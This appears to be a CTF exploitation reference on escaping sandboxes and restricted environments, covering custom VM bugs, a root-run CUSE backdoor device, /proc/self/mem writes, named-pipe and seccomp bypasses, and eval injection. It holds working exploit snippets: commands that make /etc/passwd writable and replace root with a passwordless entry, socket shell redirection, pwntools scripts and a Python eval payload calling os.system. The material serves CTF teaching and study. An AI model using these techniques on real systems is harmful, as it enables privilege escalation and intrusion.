# CTF Pwn - Sandbox Escape and Restricted Environments

---

## Python Sandbox Escape

Python jail/sandbox escape techniques (AST bypass, audit hook bypass, MRO-based builtin recovery, decorator chains, restricted charset tricks, and more) are covered comprehensively in the `ctf-misc` skill — invoke `/ctf-misc` for pyjail techniques.

## VM Exploitation (Custom Bytecode)

**Pattern (TerViMator, Pragyan 2026):** Custom VM with registers, opcodes, syscalls. Full RELRO + NX + PIE.

**Common vulnerabilities in VM syscalls:**
- **OOB read/write:** `inspect(obj, offset)` and `write_byte(obj, offset, val)` without bounds checking allows read/modify object struct data beyond allocated buffer
- **Struct overflow via name:** `name(obj, length)` writing directly to object struct allows overflowing into adjacent struct fields

**Exploitation pattern:**
1. Allocate two objects (data + exec)
2. Use OOB `inspect` to read exec object's XOR-encoded function pointer to leak PIE base
3. Use `name` overflow to rewrite exec object's pointer with `win() ^ KEY`
4. `execute(obj)` decodes and calls the patched function pointer

## FUSE/CUSE Character Device Exploitation

**FUSE** (Filesystem in Userspace) / **CUSE** (Character device in Userspace)

**Key insight:** FUSE/CUSE devices run handler code in userspace with the permissions of the device daemon. If the daemon runs as root and exposes a command interface via the write handler, any user who can write to the device file gains root-level operations (chmod, file read/write).

**Identification:**
- Look for `cuse_lowlevel_main()` or `fuse_main()` calls
- Device operations struct with `open`, `read`, `write` handlers
- Device name registered via `DEVNAME=backdoor` or similar

**Common vulnerability patterns:**
```c
// Backdoor pattern: write handler with command parsing
void backdoor_write(const char *input, size_t len) {
    char *cmd = strtok(input, ":");
    char *file = strtok(NULL, ":");
    char *mode = strtok(NULL, ":");
    if (!strcmp(cmd, "b4ckd00r")) {
        chmod(file, atoi(mode));  // Arbitrary chmod!
    }
}
```

**Exploitation:**
```bash
# Change /etc/passwd permissions via custom device
echo "b4ckd00r:/etc/passwd:511" > /dev/backdoor

# 511 decimal = 0777 octal (rwx for all)
# Now modify passwd to get root
echo "root::0:0:root:/root:/bin/sh" > /etc/passwd
su root
```

**Privilege escalation via passwd modification:**
1. Make `/etc/passwd` writable via the backdoor
2. Replace root line with `root::0:0:root:/root:/bin/sh` (no password)
3. `su root` without password prompt

## Busybox/Restricted Shell Escalation

When in restricted environment without sudo:
1. Find writable paths via character devices
2. Target system files: `/etc/passwd`, `/etc/shadow`, `/etc/sudoers`
3. Modify permissions then content to gain root

**Key insight:** In restricted environments without sudo, look for custom character devices (`/dev/backdoor`) or writable system files. Any write primitive to `/etc/passwd` (remove root's password hash) or `/etc/sudoers` (add NOPASSWD entry) gives root.

## Shell Tricks

**File descriptor redirection (no reverse shell needed):**
```bash
# Redirect stdin/stdout to client socket (fd 3 common for network)
exec <&3; sh >&3 2>&3

# Or as single command string
exec<&3;sh>&3
```
- Network servers often have client connection on fd 3
- Avoids firewall issues with outbound connections
- Works when you have command exec but limited chars

**Find correct fd:**
```bash
ls -la /proc/self/fd           # List open file descriptors
```

**Short shellcode alternatives:**
- `sh<&3 >&3` - minimal shell redirect
- Use `$0` instead of `sh` in some shells

**Key insight:** Network servers typically have the client socket on fd 3. Redirecting stdin/stdout to this fd (`exec <&3; sh >&3 2>&3`) gives an interactive shell over the existing connection without needing outbound connectivity for a reverse shell.

---

## Write-Anywhere via /proc/self/mem (BSidesSF 2025)

When a service allows writing to arbitrary files at arbitrary offsets, target `/proc/self/mem` for code injection:

```python
from pwn import *

# Service API: send filename, offset, content
def write_mem(r, offset, data):
    r.sendline(b'/proc/self/mem')
    r.sendline(str(offset).encode())
    r.sendline(data)

# 1. Leak a return address from the stack (or use known binary address)
# 2. Write shellcode to a writable+executable region (or reuse existing code)
# 3. Overwrite return address to point to shellcode

shellcode = asm(shellcraft.sh())

r = remote(host, port)
# Overwrite code at known address (e.g., after close@plt returns)
write_mem(r, target_code_addr, shellcode)
```

**Key insight:** `/proc/self/mem` provides random-access read/write to the process's virtual memory, bypassing page protections that mmap enforces. Writing to text segments (code) works even when the segment is mapped read-only via normal mmap -- the kernel performs the write through the page tables directly. This makes it equivalent to a debugger `PTRACE_POKETEXT`.

**Requirements:** File write primitive must handle binary data (null bytes). The target offset must be a valid mapped virtual address.

---

### process_vm_readv Failure as Sandbox Escape (0CTF 2016)

**Pattern:** Sandbox validates file paths by calling `process_vm_readv()` then `realpath()`. By mapping memory with `PROT_READ` only (not remotely readable by `process_vm_readv` from the sandbox process), path validation fails silently, bypassing the check.

```c
// Create memory at fixed address with only read permission
mmap(0x13370000, 0x1000, PROT_READ, MAP_FIXED|MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
// Store path string there -- sandbox's process_vm_readv fails
// realpath() also fails -- path check bypassed entirely
// Then: open("/flag") succeeds through the sandbox
```

**Key insight:** Sandbox path validation using `process_vm_readv` assumes validation will succeed or deny. The failure case (unreadable memory) is unhandled, creating a bypass. The sandboxed process can read its own memory normally, but the supervisor process cannot read it via `process_vm_readv`.

**References:** 0CTF 2016

---

### Named Pipe mkfifo for File Size Check Bypass (Nuit du Hack 2016)

**Pattern:** Binary reads a file and checks its size before processing. Named pipes (FIFOs) report `st_size = 0` via `stat()` but deliver arbitrary data when read, bypassing size-based overflow prevention.

```bash
mkfifo /tmp/payload_pipe
# In background, feed overflow payload to the pipe
cat exploit_data > /tmp/payload_pipe &
# Binary sees size=0, skips bounds check, reads arbitrary data
./vulnerable_binary /tmp/payload_pipe
```

Combine with symlinks for string reuse: `ln -s /flag arena.c` uses an existing string in the binary as the target filename for a ROP chain.

**Key insight:** Named pipes always report `st_size = 0` in `stat()`, bypassing any size-based buffer allocation or bounds checks while delivering arbitrary-length data via `read()`. Any binary that uses `stat()` to pre-allocate or validate before `read()` is vulnerable.

**References:** Nuit du Hack 2016

---

### Lua Integer Underflow via Game Logic (ASIS CTF Finals 2017)

**Pattern:** Text-based game (written in Lua) with inventory management. Two independent percentage reductions are applied sequentially to the same value without capping the combined result: a 100% decay applied first zeros the inventory, then a 10% penalty applied to the already-zero value causes an integer underflow below zero. Selling the underflowed items generates unlimited money (the game treats a large negative count as a large positive sale value or wraps to unsigned max).

**Vulnerable logic:**
```lua
-- Applied sequentially, no combined-total check:
inventory = inventory - math.floor(inventory * 0.10)  -- 10% penalty first
inventory = inventory - math.floor(inventory * 1.00)  -- 100% decay = zeroed

-- If applied in the other order, or combined:
-- 100% decay → inventory = 0
-- 10% of 0 = 0 → total reduction = 100%, no underflow

-- But with uncapped sequential application:
-- Step 1: inventory -= inventory * decay_rate  (e.g., decay=100% → 0)
-- Step 2: inventory -= extra_penalty           (penalty on already-zero → negative)
-- Result: inventory = -penalty_amount  (wraps or treated as large positive)
```

**Exploitation:**
```python
# 1. Identify the two independent reduction events in the game loop
#    (e.g., end-of-round decay AND a transaction penalty)
# 2. Trigger both in the same game tick without intermediate capping
# 3. Verify inventory went negative (may display as large number or 0 + debt)
# 4. Sell the underflowed items: game calculates price * negative_count
#    → negative total, or wraps to huge positive → unlimited currency
# 5. Use unlimited currency to purchase the flag item
```

**Key insight:** Business logic bugs in game economies create integer underflows without any memory corruption — two uncapped percentage reductions exceeding 100% underflow the target variable. Look for any game mechanic that applies multiple independent percentage modifications to the same integer value in the same tick.

**References:** ASIS CTF Finals 2017

---

### CPU Emulator Print Opcode Python eval Injection (Midnight Sun CTF 2018)

**Pattern:** Custom CPU emulator's print function uses `eval('"' + string_buffer + '"')` to process escape sequences in the output. Build a string in emulator memory character-by-character using ADD opcodes, then inject: `"+__import__("os").system("cmd")#` to escape the string literal and execute arbitrary Python.

**Exploitation strategy:**
1. The emulator implements a custom instruction set with ADD, MOV, PRINT, etc.
2. The PRINT opcode reads a string from emulator memory and passes it to `eval('"' + s + '"')` to handle escape sequences like `\n`, `\t`
3. Use ADD opcodes to build the injection string character-by-character in emulator memory
4. The injected string `"+__import__("os").system("cmd")#` closes the opening quote, concatenates with `__import__("os").system()`, and `#` comments out the trailing quote

```python
from pwn import *

# Emulator opcodes (example encoding)
ADD = 0x01   # ADD addr, immediate_byte
PRINT = 0x58  # Print string from memory (triggers eval)

def build_char(c):
    """Generate ADD opcodes to set a memory byte to character c"""
    addr = current_mem_ptr()
    return bytes([ADD, addr, ord(c)])

# Build injection payload in emulator memory
cmd = "cat /flag"
injection = '''"+__import__("os").system("%s")#''' % cmd

program = b""
for c in injection:
    program += build_char(c)

# Trigger PRINT opcode -> eval('"' + injection + '"')
# eval becomes: eval('""+__import__("os").system("cat /flag")#"')
# The # comments out the trailing quote
program += bytes([PRINT, 0x00])  # PRINT from address 0

io = remote('target', 1337)
io.send(program)
io.interactive()
```

**Key insight:** When an emulator or interpreter uses `eval()` to process string output (e.g., for escape sequences), inject a quote to close the string literal, then chain arbitrary Python code. The `#` comment character truncates any trailing syntax. This is a classic eval injection -- the emulator trusts its own memory contents, but the attacker controls memory via normal CPU opcodes.

**References:** Midnight Sun CTF 2018

---

### Unicorn Emulator Syscall Blacklist Bypass via sysenter and Uncommon Syscalls (Meepwn CTF Quals 2018)

**Pattern:** A Unicorn-based shellcode runner hooks `UC_HOOK_INSN` for `int 0x80` and `UC_HOOK_MEM_*` to block forbidden syscall numbers (execve, read, write, mmap). The filter only covers the `int 0x80` entry and the handful of syscalls the authors thought of.

**Bypass:**
1. Use `sysenter` instead of `int 0x80` — Unicorn's `INT` hook does not fire on the fast entry path.
2. Use functionally equivalent syscalls that are not on the blacklist:
   - `dup3` instead of `dup2`
   - `openat` instead of `open`
   - `pread64` instead of `read`
   - `sendfile` to move a file descriptor's contents straight to another fd without touching `write`
3. Stage the payload so the final stage is `execve("/bin/sh", ...)` via `sys_socketcall` (opcode `0x66`) + crafted syscall-mode transition, if even `execve` is in the blacklist.

```asm
; Swap file from /flag to stdout without read/write
mov eax, 0x123            ; __NR_openat
mov ebx, -100             ; AT_FDCWD
lea ecx, [flag_path]
xor edx, edx
sysenter                  ; NOT int 0x80 — bypasses Unicorn INT hook

; fd is now in eax
mov ebx, eax              ; src fd
mov ecx, 1                ; dst fd (stdout)
xor edx, edx              ; NULL offset
mov esi, 0x1000           ; count
mov eax, 0xbb             ; __NR_sendfile
sysenter
```

**Key insight:** Instruction-level filters in Unicorn hook specific opcodes. If the filter only watches `int 0x80`, any other syscall entry (`sysenter`, `syscall`, `int 0x2e` on x86-32 test builds) slips through. Always enumerate functionally equivalent syscalls: `dup3/openat/pread64/sendfile/writev/mmap2` cover almost everything a blacklist of `execve/read/write/mmap` forgets.

**References:** Meepwn CTF Quals 2018 — writeups 10415, 10428

---

## Custom VM swap Pointer Self-Overwrite (HITCON 2018)

**Pattern:** A custom VM exposes a `swap(a, b)` instruction that reads two stack indices relative to the saved `sp`. If the VM never validates that `sp_nxt` is within bounds, calling `swap(-1, 0)` or `swap(-2, -1)` addresses the internal `sp_nxt` itself and exchanges it with a stack slot. Subsequent instructions then operate on arbitrary memory.

```text
swap(-1, 0)     # treats &sp_nxt as stack[-1]; swaps sp_nxt <-> stack[0]
# sp_nxt now points wherever stack[0] used to; writes go anywhere
```

Chain with a `push` that stores shellcode bytes at the new pointer, then redirect a function pointer from the VM's dispatch table to the shellcode region.

**Key insight:** Any VM primitive that rewrites its own state pointer is an immediate arbitrary-write primitive. Always probe VM opcodes for boundary conditions where the stack pointer itself is addressable.

**References:** HITCON CTF 2018 — Abyss I, writeups 11918-11919

## Fake and Broken Seccomp Filters (verify before designing around them)

A filter in the binary is not a filter in effect. Four failure modes show up constantly in CTF:

1. **It never installs.** `prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &prog)` returns `-EINVAL` when a jump targets past the end of the program, when `PR_SET_NO_NEW_PRIVS` was not set first, or when the arch test is wrong; `seccomp()` fails the same way. The program usually ignores the return value and keeps running unprotected.
2. **It allows everything.** A `BPF_RET ALLOW` that the last comparison falls through to makes the final `BPF_RET KILL` unreachable.
3. **It is installed at the wrong time/place:** after the vulnerable read (the ROP already ran), only in the parent, or only in a child that never runs the vulnerable code. Children inherit a filter only if it was installed before the fork.
4. **Wrong ABI:** 32-bit/x32 syscall numbers (`nr | 0x40000000`, or the i386 ABI) slip past filters that do not validate `arch` or truncate the number.

Five-minute check on the binary (not on the source):

```bash
seccomp-tools dump ./binary            # the real program: is every KILL reachable?
strace -f -e trace=prctl,seccomp ./binary   # = -1 EINVAL means "no sandbox"
```

If `dump` prints nothing and strace shows no successful install, skip the ORW chain and use `execve` / `system` / `openat` freely.

**Case: ez_orw (CCB_CISCN 2025).** A 9-instruction filter, then two `prctl` calls whose return values are ignored. Instruction 2 is `JEQ 0xffffffff, jt=0, jf=6`, and `2 + 1 + 6 = 9` is one past the last instruction (indices 0-8), so the kernel rejects the program: `EINVAL`. Rebuilding the same array and calling `prctl(PR_SET_SECCOMP, 2, &prog)` reproduces `seccomp = -1, errno = 22 (EINVAL)` - there is no sandbox at all, and the overflow is exploited like an unprotected binary.

**Case: therewasneveraman (Spark 2026 Week5).** A valid 10-instruction whitelist (open/read/write/close/exit/exit_group/rt_sigprocmask), ending in `return ALLOW` then `return KILL`. The last comparison is `if (A == exit)` with `jt=0, jf=0`, so both outcomes land on `return ALLOW`; the `return KILL` is unreachable and every syscall is permitted. `seccomp-tools dump` shows it in one screen; the exploit ends with a plain `system("/bin/sh")`.

## PR_SET_DUMPABLE and Seccomp User-Notification Supervisors

`mm->dumpable` (default 1, reset to 0 by `execve` of a setuid binary, clearable with `prctl(PR_SET_DUMPABLE, 0)`) gates **ATTACH-class** access from other processes: `ptrace`, `/proc/<pid>/mem`, `process_vm_readv` / `process_vm_writev` return `EPERM` when the target's dumpable is 0 and the caller lacks `CAP_SYS_PTRACE`. Setting 0 on yourself is always allowed, which makes it an attacker tool as much as a defense.

That matters when the "sandbox" is a second process inspecting the target through seccomp user notification (`SECCOMP_FILTER_FLAG_NEW_LISTENER`, `SECCOMP_IOCTL_NOTIF_RECV` / `NOTIF_SEND`):

- the supervisor gets a notification, reads the target's memory with `process_vm_readv(notif.pid, ...)`, decides allow/deny, and replies;
- if it **does not check `process_vm_readv`'s return value**, the target can force the copy to fail by setting its own `dumpable = 0`; the supervisor's buffer still holds the previously approved contents and the check passes on stale data.

**Case: JQCTF warmup.** The child installs a user-notification filter and passes the listener fd to the parent; the parent special-cases `open` when `args[0] == 0x13370000`, copying that page with `process_vm_readv` and comparing it with `"dobedobedo"`. The exploit ROP:

1. `open(0x13370000)` with `"dobedobedo"` mapped there - the parent's copy succeeds and the cache holds the magic string (the open itself fails, `ENOENT`);
2. `prctl(PR_SET_DUMPABLE, 0)` - now the parent's `process_vm_readv` fails with `EPERM`;
3. `read(0, 0x13370000, ...)` - overwrite the path with `"/flag"`;
4. `open(0x13370000)` - the copy fails, the return value is ignored, `memcmp` still sees the stale `"dobedobedo"`, so the kernel opens the real `/flag`; read fd 2 and write it out.

The lesson generalizes: when the sandbox is a separate process, the target controls its own dumpable/ptrace state, so every unchecked copy or cached decision becomes a confused-deputy bug. In a kernel ROP `prctl` is syscall 157 with `PR_SET_DUMPABLE = 4`, i.e. one syscall slot.
